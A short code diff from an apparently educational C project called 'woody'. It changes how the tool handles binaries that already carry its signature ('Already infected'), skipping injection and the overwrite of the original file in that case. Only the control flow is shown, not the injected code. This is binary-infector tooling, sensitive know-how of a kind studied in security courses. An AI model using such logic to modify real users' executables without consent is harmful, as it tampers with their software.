@@ -6,13 +6,14 @@
 /*   By: damien <damien@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/05 15:02:19 by dhubleur          #+#    #+#             */
-/*   Updated: 2024/06/14 13:14:40 by damien           ###   ########.fr       */
+/*   Updated: 2024/06/14 13:23:26 by damien           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "woody.h"
 
 static bool move(char const *src_filename, char const *dest_filename);
+
 
 bool woody(char *filename)
 {
@@ -27,16 +28,17 @@ bool woody(char *filename)
 		return false;
 	close_file(file);
 
-	if (check_signature_present(injection)) {
-		printf("Already infected\n");
-		return false;
+	bool already_signed = check_signature_present(injection);
+	if (!already_signed) {
+		inject(injection);
 	}
 
-	inject(injection);
 	end_injection(injection);
 
-	if (!move(WOODY_TMP_FILE, filename))
-		return false;
+	if (!already_signed) {
+		if (!move(WOODY_TMP_FILE, filename))
+			return false;
+	}
 	return true;
 }
 
